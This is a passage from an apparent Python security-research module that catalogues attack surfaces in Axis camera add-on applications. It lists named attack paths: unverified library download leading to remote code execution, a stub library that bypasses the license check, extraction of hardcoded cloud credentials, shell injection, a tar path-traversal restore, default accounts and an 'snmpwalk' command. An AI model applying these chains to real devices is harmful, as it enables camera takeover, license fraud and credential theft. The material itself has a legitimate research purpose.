                    'mechanism': (
                        'post_install.sh: shttpclient fetches http://www.axis.com/techsup/.../cam_form.php?type=free '
                        'and injects response into admin license form. No TLS, no validation. '
                        'Attacker controls DNS for www.axis.com → serve malicious JS → stored XSS in admin panel.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'DNS MITM on camera network + DAT install trigger',
                },
                {
                    'id': 'DAT-2',
                    'title': 'Lua decryption key (encpwd) extraction → plaintext source recovery',
                    'mechanism': 'encpwd is the per-package key; Axis Lua runtime decrypts files at load. Hook decryption function via LD_PRELOAD on Lua interpreter → intercept plaintext Lua at decrypt time.',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Code exec on camera (another ACAP or shell); LD_PRELOAD allowed on Lua interpreter',
                },
                {
                    'id': 'DAT-3',
                    'title': 'Lua runtime library injection via search path control',
                    'mechanism': '<library name="digitalAutotracking"/> loaded by Axis Lua engine; if engine search path prepends a writable directory, substitute with malicious library',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Write access to Lua engine library search path',
                },
            ],
        }
        return result

    def sbplayer_aarch64_surface(self) -> dict:
        """
        AXIS Player for Soundtrack Business (sbplayer) aarch64 + ARM32 attack surface.

        appId: 413325  binary: sbplayer  version: 1.7.1  arch: aarch64 + ARM32 NOT STRIPPED
        CGI: viewer /info.cgi, administrator /ctrl.cgi (fastCGI)

        Service: Soundtrack Your Brand (SYB) music streaming on AXIS cameras.
        Uses GStreamer pipeline (appsrc → alsasink) for audio playback.
        Pairs with cloud via GraphQL mutation to soundtrackyourbrand.com.

        Key findings:

        1. Library download — same checksum-optional bypass as MIPS 1.5.0
           "checksum missing from server response, so can't verify lib and igonring download..."
           (same typo "igonring" as MIPS 1.5.0 — shared code origin confirmed)
           Download URLs hardcoded:
             https://builds.soundtrackyourbrand.com/remote/axis-arm/latest
             https://builds.soundtrackyourbrand.com/remote/axis-aarch64/latest
           If UpdateURL axparam is set, overrides the default URL.
           UpdateURL="" (empty default, hidden type) — operator-writable.
           Chain: operator auth → set UpdateURL → SSRF to attacker URL → serve .so without checksum header → library loaded → RCE.

        2. SD card library load path — physical access vector
           "SYB library on SD-card detected, trying to load it"
           Library loaded from SD card if present — checksum checked (lib_checksum_sdcard).
           Physical access → insert SD card with malicious SYB library → code execution.
           SD card checksum may be bypassable by controlling the checksum file on the same card.

        3. GraphQL pairing mutation — hardcoded cloud API credentials
           "Authorization:Basic %s" + GraphQL mutation to https://partner.soundtrackyourbrand.com/api
           Base64 Basic auth credential hardcoded in binary for the pairing API call.
           Extract base64 string from binary → decode → Soundtrack API credential.
           Mutation: generatePairingCodes with hardwareId, label, description fields
           — if any of these incorporate unsanitized camera hostname or config values, injection possible.

        4. GStreamer pipeline — appsrc injection
           Pipeline: appsrc → GStreamer → alsasink
           "Could not push buffer to appsrc." — attacker that can feed data to appsrc can inject
           audio. More relevant: if GStreamer plugin search path is writable, malicious plugin loaded.

        5. D-Bus: com.axis.AudioConf (SrcId, SinkAlsaDevice parameters)
           sbplayer communicates with camera's audio system via D-Bus AudioConf interface.
           SrcId and SinkAlsaDevice sourced from axparameter or D-Bus reply.
           If SinkAlsaDevice is user-controlled string interpolated into ALSA device path → ALSA injection.
        """
        result = {
            'app_id': 413325,
            'app_name': 'Player for Soundtrack Business',
            'binary_name': 'sbplayer',
            'version': '1.7.1',
            'arch': 'aarch64 + ARM32 (both NOT STRIPPED)',
            'cgi': {'viewer': '/info.cgi', 'administrator': '/ctrl.cgi'},
            'ctrl_cgi_actions': ['play', 'pause', 'skip'],
            'params': {
                'UpdateURL': '(empty default, hidden:string — operator-writable)',
                'Volume': '100 (int:0-100)',
                'WatchdogTimeoutMillis': '20000',
                'UpdateIntervalSeconds': '900',
                'PairingIntervalSeconds': '30',
            },
            'library_download_urls': {
                'arm': 'https://builds.soundtrackyourbrand.com/remote/axis-arm/latest',
                'aarch64': 'https://builds.soundtrackyourbrand.com/remote/axis-aarch64/latest',
                'override': 'UpdateURL axparam (operator-writable)',
            },
            'libs': [
                'libgstreamer-1.0.so.0', 'libgstaudio-1.0.so.0', 'libgstbase-1.0.so.0',
                'libgio-2.0.so.0', 'libgobject-2.0.so.0', 'libglib-2.0.so.0',
                'libaxpackage.so.1', 'libaxparameter.so.1', 'libaxstorage.so.1', 'libfcgi.so.0',
            ],
            'dynamic_lib_load': 'dlopen (SYB library from SD card or download)',
            'cloud_api': {
                'endpoint': 'https://partner.soundtrackyourbrand.com/api',
                'auth': 'Authorization: Basic <hardcoded-base64>',
                'graphql_mutation': 'generatePairingCodes (hardwareId, label, description fields)',
            },
            'dbus_interface': 'com.axis.AudioConf (SrcId, SinkAlsaDevice)',
            'attack_paths': [
                {
                    'id': 'SBP17-1',
                    'title': 'UpdateURL SSRF → checksum-optional library load → RCE',
                    'mechanism': (
                        'Operator sets UpdateURL to attacker HTTPS server. sbplayer fetches "latest" at UpdateIntervalSeconds. '
                        'Attacker serves malicious .so without checksum header → "can\'t verify lib" warning only → .so loaded via dlopen → RCE.'
                    ),
                    'severity': 'CRITICAL',
                    'prerequisite': 'Operator-level auth to write UpdateURL axparam',
                    'note': 'Same bypass as MIPS 1.5.0 (SBP-1); confirmed shared codebase',
                },
                {
                    'id': 'SBP17-2',
                    'title': 'SD card malicious SYB library load',
                    'mechanism': 'Insert SD card with SYB library + forged checksum file; sbplayer prefers SD card path; dlopen executes attacker library',
                    'severity': 'HIGH',
                    'prerequisite': 'Physical access to camera SD card slot',
                },
                {
                    'id': 'SBP17-3',
                    'title': 'Hardcoded Soundtrack API credential extraction',
                    'mechanism': '"Authorization:Basic %s" with hardcoded base64 string in binary; extract → decode → Soundtrack partner API credential for all sbplayer deployments',
                    'severity': 'HIGH',
                    'prerequisite': 'Binary access (this file)',
                },
                {
                    'id': 'SBP17-4',
                    'title': 'SinkAlsaDevice ALSA device path injection via D-Bus',
                    'mechanism': 'com.axis.AudioConf SinkAlsaDevice value incorporated into ALSA device selection; if unsanitized → ALSA device path injection',
                    'severity': 'MEDIUM',
                    'prerequisite': 'D-Bus access to AudioConf interface',
                },
            ],
        }
        return result

    def dce_surface(self) -> dict:
        """
        AXIS Door Controller Extension (DoorControllerExtension) attack surface.

        appId: 414114  binary: DoorControllerExtension  version: 1.1.5  arch: ARM32 armhf NOT STRIPPED
        STARTMODE=never — setup tool only, not a persistent daemon.
        No CGI paths, no param.conf content.

        Key findings:

        1. Minimal binary — only main + _start symbols
           libc.so.6 only dependency. No libaxhttp, no libaxparameter, no libcurl.
           Binary is almost certainly a stub launcher or config writer.
           Actual door controller integration lives in camera firmware (door controller SDK).

        2. Build path leak: developer home directory disclosed
           String in binary: "/home/svcj/workspace/Teams/NB/Accesscontrol/AXIS_Door_Controller_Extension/Build-Acap-Products/armv7hf_Build/app"
           Developer username: svcj
           Team path: Teams/NB/Accesscontrol
           Workspace layout: Build-Acap-Products/ with per-arch subdirs
           OPSEC finding — developer environment structure disclosed in production binary.

        3. LICENSEPAGE=axis — Axis license management (not custom)
           License check handled by Axis license server, not local liblicensekey.so.
           Different attack surface than the licensekey bypass chain.
        """
        result = {
            'app_id': 414114,
            'app_name': 'AXIS Door Controller Extension',
            'binary_name': 'DoorControllerExtension',
            'version': '1.1.5',
            'arch': 'ARM32 armhf NOT STRIPPED',
            'run_mode': 'never — setup tool only',
            'libs': ['libc.so.6'],
            'build_path_leak': '/home/svcj/workspace/Teams/NB/Accesscontrol/AXIS_Door_Controller_Extension/Build-Acap-Products/armv7hf_Build/app',
            'developer_username': 'svcj',
            'team_path': 'Teams/NB/Accesscontrol',
            'license_type': 'LICENSEPAGE=axis (Axis license server, not local liblicensekey)',
            'attack_paths': [
                {
                    'id': 'DCE-1',
                    'title': 'Build path disclosure — developer home and team structure',
                    'mechanism': 'Developer username svcj + team path NB/Accesscontrol disclosed in production binary strings',
                    'severity': 'INFO',
                    'note': 'OPSEC finding; username usable for directory/repo enumeration',
                },
            ],
        }
        return result

    def ucs_sip_surface(self) -> dict:
        """
        AXIS Client for Unified Communication Systems (SipThirdPartyIntegration) surface.

        appId: 414930  binary: SipThirdPartyIntegration  version: 1.0.2
        Available as: aarch64 (SHA 0fa6c8) + armhf (SHA 8b2941) — same source, two arches.
        NOT STRIPPED — full debug info, DWARF symbols.

        This binary is almost entirely a license check + sipd availability sentinel.
        The actual SIP functionality lives in sipd (Axis daemon, not in this package).

        Key findings:

        1. sipd dependency gate (post_install.sh)
           Post-install: `test -f /usr/bin/sipd || exit 77`
           Exit 77 = abort installation. ACAP silently non-functional if sipd absent.
           Exploitable: spoofing /usr/bin/sipd (zero-byte or minimal file) satisfies the
           check without starting a real SIP daemon. Camera appears to have UCS installed
           but makes no SIP calls — useful for capability spoofing in mixed-camera deployments.

        2. sipd integration path: /etc/dynamic/sipd/acaps/third-party-integration-enabled
           Binary creates/removes this file to signal sipd that third-party integration is
           active. Writable by ACAP process user; if another ACAP can write this path,
           it can enable SIP integration without the licensed ACAP being installed.

        3. LD_PRELOAD / /etc/ld.so.preload detection
           Binary explicitly checks LD_PRELOAD and /etc/ld.so.preload for library injection.
           Functions: test_ld_preload, test_ld_so_preload, test_ld_so_preload.constprop.0
           dir_contains_overriding_lib — scans dirs for overriding .so files.
           This is the liblicensekey.so bypass detection code running at startup.
           Implication: dlopen-based bypass is the viable path (not LD_PRELOAD injection).

        4. dlopen chain for liblicensekey.so bypass
           dlopen/dlsym from GLIBC_2.34 present. Binary dynamically loads:
             liblicensekey.so / liblicensekey.so.1 — the license verification library
             libparhand.so — parameter handler
             libcrypto.so — OpenSSL crypto
           Bypass: substitute liblicensekey.so in dlopen search path (RUNPATH / local dir)
           with a stub that exports licensekey_verify/licensekey_verify_ex returning success.

        5. licensekey_dyn_get_exp_date — dynamic expiry check
           Calls both licensekey_verify and licensekey_dyn_verify_ex; both must pass.
           Static (compiled-in) and dynamic (runtime) license checks are separate.
        """
        result = {
            'app_id': 414930,
            'app_name': 'AXIS Client for Unified Communication Systems',
            'binary_name': 'SipThirdPartyIntegration',
            'version': '1.0.2',
            'arch_variants': {
                'aarch64': 'SHA 0fa6c8, GCC 13.2.0 (Yocto SDK sysroots/aarch64)',
                'armhf': 'SHA 8b2941, GCC 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)',
            },
            'stripped': False,
            'debug_info': True,
            'sipd_dependency': '/usr/bin/sipd — test in post_install.sh; exit 77 if absent',
            'integration_flag_path': '/etc/dynamic/sipd/acaps/third-party-integration-enabled',
            'ld_preload_detection': [
                'test_ld_preload', 'test_ld_so_preload', 'dir_contains_overriding_lib',
            ],
            'libs': [
                'libgio-2.0.so.0', 'libgobject-2.0.so.0', 'libglib-2.0.so.0',
                'liblicensekey.so.1',
            ],
            'attack_paths': [
                {
                    'id': 'UCS-1',
                    'title': 'sipd absence spoofing — capability stub bypass',
                    'mechanism': (
                        'Create minimal /usr/bin/sipd (empty file, chmod +x). '
                        'Satisfies post_install.sh check (exit 77 avoided). '
                        'ACAP installed but sipd functionality absent — presence-of-capability spoofing.'
                    ),
                    'severity': 'LOW',
                    'prerequisite': 'Write access to /usr/bin/ (requires elevated access or another vuln)',
                },
                {
                    'id': 'UCS-2',
                    'title': 'third-party-integration-enabled flag manipulation',
                    'mechanism': (
                        'Write /etc/dynamic/sipd/acaps/third-party-integration-enabled without valid license. '
                        'Signals sipd that integration is active; may enable SIP features without licensed ACAP.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'ACAP process user write access to /etc/dynamic/sipd/acaps/',
                },
                {
                    'id': 'UCS-3',
                    'title': 'liblicensekey.so stub bypass via dlopen path control',
                    'mechanism': (
                        'Place stub liblicensekey.so (exporting licensekey_verify=true) in dlopen '
                        'search path ahead of system library. Binary detects LD_PRELOAD but not '
                        'RUNPATH manipulation at package install dir.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Write access to /usr/local/packages/SipThirdPartyIntegration/ or RUNPATH control',
                },
            ],
        }
        return result

    def people_counter_s5l_surface(self) -> dict:
        """
        AXIS People Counter 4.0.0 (aarch64 tvpc, ARTPEC-5/S5L variant) attack surface.

        appId: 211490  binary: tvpc  version: 4.0.0  arch: aarch64 stripped
        Same binary name as 4.6.110 but older version; this is the S5L (ARTPEC-5) variant.

        Key differences from 4.6.110:
          - Version 4.0.0 (4.6.110 added SlavePass axparam, TrueviewVAPIX account removal)
          - Counter0EventListenerPort=23456 confirmed in param.conf (default)
          - postinst.sh: chmod 755 for group viewer on most files
          - Backup/restore: same tarslip surface (cd /tmp/; tar czf tvpc-parambackup.tar.gz ...)
          - TrueviewVAPIX account removal NOT present in 4.0.0 postinst — implies weak default
            VAPIX account present and active on 4.0.0 cameras
          - Apache proxy: /stereo → 127.0.0.1:50000 (same vision stereo camera proxy)
          - NTP manipulation: postinst.sh sets up custom NTP server; NTPD_ARGS=-r -t 60
          - Old bundled curl binary (armhf): libcurl.so.4 linked statically

        Credential note:
          - TrueviewVAPIX account removed in 4.6.110 postinst but NOT in 4.0.0
          - Any 4.0.0 deployment may still have the TrueviewVAPIX VAPIX account with default/weak password
          - Chain: find TrueviewVAPIX user → default password → VAPIX admin access → camera root
        """
        result = {
            'app_id': 211490,
            'app_name': 'AXIS People Counter',
            'binary_name': 'tvpc',
            'version': '4.0.0',
            'arch': 'aarch64 ELF stripped',
            'libs': [
                'libcapture.so.1', 'libparam.so.1', 'libevent.so.0', 'libnet_http.so.0',
                'libaxevent.so.1', 'libaxhttp.so.1', 'libaxparameter.so.1',
                'libvdostream.so.1', 'libcurl.so.4', 'libjson.so.0', 'liblicensekey.so.1',
            ],
            'tcp_port': 23456,
            'bundled': ['curl (armhf binary)', 'apache.conf', 'install_stream_profile.sh'],
            'key_diff_from_4610': {
                'trueview_vapix_account': (
                    'NOT removed in 4.0.0 postinst.sh. 4.6.110 explicitly removes TrueviewVAPIX account. '
                    '4.0.0 cameras may retain this account with default/weak VAPIX password.'
                ),
                'slave_pass_axparam': 'SlavePass axparameter NOT confirmed in 4.0.0 param.conf',
                'ntp_setup': 'postinst.sh installs custom NTP (NTPD_ARGS=-r -t 60); may affect time sync for other services',
            },
            'attack_paths': [
                {
                    'id': 'PC40-1',
                    'title': 'TrueviewVAPIX default VAPIX account on 4.0.0 cameras',
                    'mechanism': (
                        'TrueviewVAPIX VAPIX account exists on 4.0.0 cameras (not removed until 4.6.110). '
                        'Default or guessable password → VAPIX admin-level access → full camera control.'
                    ),
                    'severity': 'CRITICAL',
                    'prerequisite': 'Camera network access; 4.0.0 firmware',
                },
                {
                    'id': 'PC40-2',
                    'title': 'TCP 23456 unauth injection (inherited from 4.6.110)',
                    'mechanism': 'Counter0EventListenerPort=23456 confirmed; same raw TCP inject surface as 4.6.110',
                    'severity': 'HIGH',
                    'prerequisite': 'Network access to port 23456',
                },
                {
                    'id': 'PC40-3',
                    'title': 'Backup tarslip (inherited from 4.6.110)',
                    'mechanism': 'cd /tmp/; tar czf tvpc-parambackup.tar.gz ... — same restore path traversal class',
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level auth for backup restore trigger',
                },
            ],
        }
        return result

    def people_counter_v5_surface(self) -> dict:
        """
        AXIS People Counter 5.0.5 (tvpc Rust rewrite) attack surface.

        appId: 211490  binary: tvpc  version: 5.0.5  arch: aarch64 (ARTPEC-8/CV25/S5L/ARTPEC-7)
        APPUSR=sdk  APPGRP=sdk  — ROOT DROPPED in 5.x (was root in 4.x and earlier)
        STARTMODE=respawn  HTTPCGIPATHS (via manifest)
        source: ftp_mirror/ACAP/applications/ACAP/AXIS_People_Counter/5_0_5/

        5.x is a Rust rewrite of the tvpc daemon (crate: tvpcrs). Architecture change:
          - Rust async runtime: async-executor-1.5.1, async-broadcast-0.5.1, futures-util
          - D-Bus via zbus-3.x (zvariant, zbus_names) — cookie SHA1 auth method
          - libsodium NaCl box encryption for secrets: crypto_secretbox/crypto_secretbox_open
          - VAPIX credentials via D-Bus: tvpcrs::local_vapixFailed to get LocalVapixCredentials
          - TCP 23456 event listener still present (Counter0EventListenerPort in param.conf)
          - TCP 4066 master/slave still present (Counter.SlavePort/MasterPort in binary + param.conf)
          - restore_backup CGI still present (administrator level)
          - popen still used: gen_allparams_page(): popen
          - Shell tar backup: cd /tmp/; tar czf tvpc-parambackup.tar.gz parambackup.txt params.meta
          - Counter.SlavePass migrated to libsodium secrets storage (Migrating parameter %s to secrets)
          - DBUS_COOKIE_SHA1 auth method for D-Bus sessions

        Bundled: curl (bundled binary), libcjson.so.1, libmd5.so, libsodium.so.23
        Param filtering: parhandclient getgroup root.tvpc | grep -v -e 'Counter0Name' -e 'Counter0OccName'
          -e 'Environment0' -e 'Build0' > /tmp/parambackup.txt  (SlavePass NOT in filter)

        CGI access (manifest / cgi.conf):
          viewer:    /.api
          operator:  /.apioperator
          administrator: /.apiadmin, /.restore_backup

        Key delta from 4.x:
          APPUSR=root→sdk (sandbox user, reduced blast radius)
          SlavePass now encrypted with libsodium (not plaintext in params.meta)
          TCP 23456/4066 still in param.conf and binary string table
          popen and shell tar backup still present (same injection class)
        """
        result = {
            'app': 'AXIS People Counter',
            'version': '5.0.5',
            'app_id': 211490,
            'binary': 'tvpc (Rust, aarch64)',
            'run_as': 'sdk (dropped root from 4.x)',
            'arch': 'aarch64 (ARTPEC-8/7, CV25, S5L)',
            'bundled_libs': ['curl', 'libcjson.so.1', 'libmd5.so', 'libsodium.so.23'],
            'runtime': 'Rust (tvpcrs crate), async-executor, zbus D-Bus, libsodium NaCl',
            'cgi': {
                'viewer': '/.api',
                'operator': '/.apioperator',
                'administrator': ['/.apiadmin', '/.restore_backup'],
            },
            'ports': {'event_listener': 23456, 'slave_sync': 4066},
            'attack_paths': [
                {
                    'id': 'PC5-1',
                    'title': 'popen shell injection via allparams generation (operator)',
                    'mechanism': (
                        'gen_allparams_page() calls popen() to run parambackup shell command: '
                        'cd /tmp/; tar czf tvpc-parambackup.tar.gz parambackup.txt params.meta. '
                        'Injection surface: operator-writable axparameter values interpolated into '
                        'format strings passed to popen(). Same class as PC-1 in 4.x. '
                        'APPUSR=sdk means RCE lands in sdk sandbox, not root — reduced blast radius vs 4.x.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level camera auth',
                    'delta_vs_4x': 'Same vector; blast radius reduced (sdk vs root)',
                },
                {
                    'id': 'PC5-2',
                    'title': 'Tarslip via .restore_backup (administrator) — sdk sandbox user',
                    'mechanism': (
                        'tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup — same tarslip class. '
                        'Writes attacker-controlled files to /tmp/backup; '
                        'cp /tmp/backup/licbackup.xml /usr/local/packages/tvpc/lic.xml — license override. '
                        'Now runs as sdk (APPUSR), not root. Impact: ACAP package dir control, not full camera takeover.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Administrator-level camera auth',
                    'delta_vs_4x': 'Same vector; blast radius reduced (sdk vs root)',
                },
                {
                    'id': 'PC5-3',
                    'title': 'TCP 23456 unauth event listener — still present in 5.0.5',
                    'mechanism': (
                        'Counter0EventListenerPort=23456 in param.conf. Counter.SlavePort/MasterPort '
                        'string refs in binary. TCP 23456 passage event injection still accepted from '
                        'any LAN host without auth. Sends false people-count data → corrupts occupancy analytics.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Network access to camera LAN',
                },
                {
                    'id': 'PC5-4',
                    'title': 'TCP 4066 master/slave sync — still present, SlavePass now libsodium-encrypted',
                    'mechanism': (
                        'Counter.SlavePort=4066 in binary; Counter0SlavePort in param.conf. '
                        'SlavePass now stored via crypto_secretbox (libsodium NaCl). '
                        'If libsodium key is derivable from device-specific material (serial/MAC), '
                        'slave auth bypass still possible. Counter0SlaveAddress SSRF still applies: '
                        'attacker-controlled SlaveAddress redirects sync to rogue master.'
                    ),
                    'severity': 'LOW',
                    'prerequisite': 'Network access to 4066 + libsodium key recovery',
                },
                {
                    'id': 'PC5-5',
                    'title': 'VAPIX credentials via D-Bus (tvpcrs::local_vapix)',
                    'mechanism': (
                        'tvpcrs::local_vapix fetches LocalVapixCredentials via D-Bus. '
                        'Credential used for internal VAPIX calls (Authorization: Bearer %s). '
                        'If D-Bus session is accessible to co-resident ACAP, credential sniffable.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Co-resident ACAP on same device',
                },
            ],
        }
        return result

    def queue_monitor_v3_surface(self) -> dict:
        """
        AXIS Queue Monitor 3.0.20 (tvqu Rust rewrite) attack surface.

        appId: 211492  binary: tvqu  version: 3.0.20  arch: aarch64 (ARTPEC-8/7, CV25, S5L)
        APPUSR=sdk  APPGRP=sdk  — ROOT DROPPED in 3.x (was sdk in 2.x? verify)
        STARTMODE=respawn
        source: ftp_mirror/ACAP/applications/ACAP/AXIS_Queue_Monitor/3_0_20/

        3.0.20 shares architecture with People Counter 5.x (same Rust crate base, libsodium,
        same bundled libs). Binary: tvqu (vs tvpc for People Counter).

        New in 3.x vs 2.x:
          - WebReportUpload: configurable web upload with AllowInsecure mode + encrypted=true API
          - Httppost.AllowInsecure — second insecure HTTP upload path
          - folder_password — credential for folder/cloud upload target (secrets storage)
          - libsodium encryption for secrets (crypto_secretbox/open)
          - CURL command: CURL_CA_BUNDLE=... curl -L -f --anyauth %s %s -s -m 20
                          '%s://%s%s/api/?method=camera.ping&encrypted=true'
            %s slots include protocol (http/https) and host — from operator axparam
          - Histogram binary files: hval.buf, hvalmin.buf, hvalpeople.buf in localdata/
          - Content-Disposition downloads: queue-%s-logs.tgz, queue-%s-params-copy.tar.gz

        CGI access:
          viewer:    /.api
          operator:  /.apioperator
          administrator: /.apiadmin, /.restore_backup

        Key findings:
        1. WebReportUpload SSRF: WebReportUpload0Url axparam + AllowInsecure → attacker controls
           full upload URL (protocol + host); curl executes to attacker server.
        2. Restore tarslip: tar xzf → cp lic.xml (license override) + histogram binary files.
        3. folder_password credential in secrets; libsodium-encrypted.
        4. popen still used (gen_allparams_page()).
        """
        result = {
            'app': 'AXIS Queue Monitor',
            'version': '3.0.20',
            'app_id': 211492,
            'binary': 'tvqu (Rust, aarch64)',
            'run_as': 'sdk',
            'arch': 'aarch64 (ARTPEC-8/7, CV25, S5L)',
            'bundled_libs': ['curl', 'libcjson.so.1', 'libmd5.so', 'libsodium.so.23'],
            'runtime': 'Rust (same crate base as tvpcrs), zbus D-Bus, libsodium NaCl',
            'cgi': {
                'viewer': '/.api',
                'operator': '/.apioperator',
                'administrator': ['/.apiadmin', '/.restore_backup'],
            },
            'attack_paths': [
                {
                    'id': 'QM3-1',
                    'title': 'SSRF via WebReportUpload0Url + AllowInsecure (operator)',
                    'mechanism': (
                        'WebReportUpload0Url is operator-writable. curl command: '
                        'CURL_CA_BUNDLE=... curl -L -f --anyauth %s %s -s -m 20 '
                        "'%s://%s%s/api/?method=camera.ping&encrypted=true' "
                        '— protocol and host from axparam → SSRF to attacker-controlled server. '
                        'WebReportUpload0AllowInsecure=1 + Httppost.AllowInsecure disable TLS check → MITM. '
                        'WebReportUpload0ProxyEnabled + Proxy param adds proxy hop to SSRF chain.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level camera auth',
                },
                {
                    'id': 'QM3-2',
                    'title': 'popen shell injection via allparams/parambackup (operator)',
                    'mechanism': (
                        'gen_allparams_page(): popen — same class as PC5-1. '
                        'cd /tmp/; tar czf tvqu-parambackup.tar.gz parambackup.txt params.meta — shell tar. '
                        'Operator-writable axparams → shell injection → sdk process RCE.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level camera auth',
                },
                {
                    'id': 'QM3-3',
                    'title': 'Tarslip via .restore_backup — license + histogram binary override',
                    'mechanism': (
                        'tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup — tarslip class. '
                        'cp /tmp/backup/licbackup.xml /usr/local/packages/tvqu/lic.xml — license override. '
                        'cp /tmp/hval.buf /usr/local/packages/tvqu/localdata/hval.buf — histogram data override. '
                        'Histogram binary files control queue analytics output; overwriting them '
                        'corrupts queue-length metrics without exploiting any crypto.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Administrator-level camera auth',
                },
                {
                    'id': 'QM3-4',
                    'title': 'folder_password credential in libsodium secrets',
                    'mechanism': (
                        'folder_password axparam is migrated to libsodium crypto_secretbox storage. '
                        'If libsodium key is device-derived (serial/MAC), offline key recovery → '
                        'decrypt folder_password → gain access to cloud upload target (folder storage, SFTP, etc.).'
                    ),
                    'severity': 'LOW',
                    'prerequisite': 'Physical device access for serial number + libsodium key derivation analysis',
                },
            ],
        }
        return result

    def direction_detector_surface(self) -> dict:
        """
        AXIS Direction Detector 3.16.3 attack surface (Cognimatics tvpc variant).

        appId: 220302  binary: tvpc  version: 3.16.3  arch: armv7hf (ARTPEC-6/7, S2E/S2L/S5/S5L)
        APPUSR=root  APPGRP=root
        Codebase: identical to People Counter 3.x (same tvpc binary, same param schema)
        Key addition: anon-gui module (privacy.sh runs mount --bind as root)

        Differences vs People Counter:
          - APPID 220302 vs 211490; MENUNAME/SETTINGSPAGEFILE differ
          - Includes modules/anon-gui/anon/ for video anonymization (privacy.sh)
          - debugar.cgi: config for FTP coredump upload to ftp://upload.cognimatics.com
          - cgipaths: /direction-detector/.restore_backup + /people-counter/.restore_backup both exposed
          - All Counter0* / WebReportUpload0* / Occ* params identical to People Counter

        Full tvpc attack surface: see people_counter_surface() — all vectors apply identically.
        """
        result = {
            'package': 'tvpc',
            'vendor': 'Axis Communications (Cognimatics)',
            'version': '3.16.3',
            'app_id': '220302',
            'type': 'eap_acap',
            'arch': 'armv7hf',
            'appusr': 'root',
            'privilege': 'ROOT — all tvpc vectors execute as root',
            'variants': ['Direction Detector', 'People Counter (shared codebase)'],
            'additional_attack_paths': {
                'DD-1': {
                    'severity': 'HIGH',
                    'title': 'privacy.sh runs mount --bind as root via anon-gui',
                    'detail': (
                        'modules/anon-gui/anon/privacy.sh takes 3 shell args: action, anon_folder, priv_img_url. '
                        'ACTION="$1" ANON_FOLDER="$2" PRIVACY_IMAGE_URL="$3" — no quoting on use in sed/cp/mount. '
                        'Called as root. mount --bind $BLOCKER_FILE $MCAST where BLOCKER_FILE=$PERSIST/blocker.sh '
                        'and PERSIST=/usr/local/anon (writable if ACAP operator can influence anon_folder arg). '
                        'Can overwrite /usr/sbin/mcast-always-setter with arbitrary script via bind mount.'
                    ),
                    'exploit_chain': 'Operator triggers privacy mode via .apiadmin CGI -> privacy.sh called as root -> mount --bind attacker-controlled script over /usr/sbin/mcast-always-setter -> arbitrary execution',
                },
                'DD-2': {
                    'severity': 'MEDIUM',
                    'title': 'FTP coredump exfil to hardcoded Cognimatics server',
                    'detail': (
                        'debugar.cgi config: TargetURL="ftp://upload.cognimatics.com" TargetPath="/coredumps". '
                        'Core dumps include stack frames, heap contents, and memory-resident secrets (SlavePass, '
                        'VAPIX credentials). If core dump upload is enabled, secrets exfiltrate to Cognimatics FTP. '
                        'Not operator-configurable — URL is hardcoded in config file.'
                    ),
                },
                'DD-3': {
                    'severity': 'HIGH',
                    'title': 'Dual .restore_backup tarslip: /direction-detector/ and /people-counter/ both exposed',
                    'detail': (
                        'cgipaths.conf registers both /direction-detector/.restore_backup and '
                        '/people-counter/.restore_backup at operator level. Two tarslip entry points, '
                        'same underlying handler (tvpc binary, running as root).'
                    ),
                },
            },
            'tvpc_vectors_apply': 'All vectors from people_counter_surface() apply — popen, tarslip, TCP 23456/4066, SlavePass, VAPIX credentials, WebReportUpload0 SSRF/AllowInsecure, AxisAnalytics account creation',
        }
        return result

    def random_selector_surface(self) -> dict:
        """
        AXIS Random Selector 3.12.0/3.16.x attack surface (Cognimatics tvpc variant + mini_snmpd).

        appId: 220304  binary: tvpc  version: 3.12.0  arch: armv7hf (ARTPEC-4/5/6/7, L2/S2E/S2L/S3L)
        APPUSR=root  APPGRP=root
        Codebase: identical to People Counter 3.x plus mini_snmpd bundled binary

        Key addition vs People Counter/Direction Detector: mini_snmpd (43KB stripped ARM ELF).
        SNMP community defaults to "public"; auth disabled by default (Snmp0Enabled="0").
        When admin enables SNMP, mini_snmpd starts without -a flag -> SNMPv1/v2c with community "public".
        """
        result = {
            'package': 'tvpc',
            'vendor': 'Axis Communications (Cognimatics)',
            'version': '3.12.0',
            'app_id': '220304',
            'type': 'eap_acap',
            'arch': 'armv7hf',
            'appusr': 'root',
            'privilege': 'ROOT — all tvpc vectors execute as root',
            'additional_binaries': {
                'mini_snmpd': {
                    'size': '43768 bytes (stripped ARM ELF)',
                    'default_community': 'public',
                    'auth_default': 'disabled (no -a flag) — SNMPv1/v2c read access with community "public"',
                    'param': 'Snmp0Enabled="0" Snmp0Community="public" Snmp0Traps="0"',
                },
            },
            'additional_attack_paths': {
                'RS-1': {
                    'severity': 'HIGH',
                    'title': 'mini_snmpd SNMPv2c with default "public" community — unauthenticated read',
                    'detail': (
                        'When admin enables SNMP (Snmp0Enabled=1), mini_snmpd starts with Snmp0Community string. '
                        'Default is "public". No -a flag used -> no auth enforcement. '
                        'SNMPv1/v2c GET walk exposes camera system MIB (sysDescr, sysLocation, ifTable, '
                        'routes, running processes). Snmp0Traps allows attacker-controlled trap destination.'
                    ),
                    'exploit': 'snmpwalk -v2c -c public <camera_ip> 1.3.6',
                },
                'RS-2': {
                    'severity': 'MEDIUM',
                    'title': 'Dual .restore_backup tarslip: /random-selector/ and /people-counter/ both exposed',
                    'detail': 'cgipaths.conf registers both CGI paths at operator level. Same root tarslip vector as People Counter.',
                },
            },
            'tvpc_vectors_apply': 'All vectors from people_counter_surface() apply — popen, tarslip, TCP 23456/4066, SlavePass, VAPIX credentials, WebReportUpload0 SSRF/AllowInsecure, AxisAnalytics account creation',
        }
        return result

    def sbplayer_mips_surface(self) -> dict:
        """
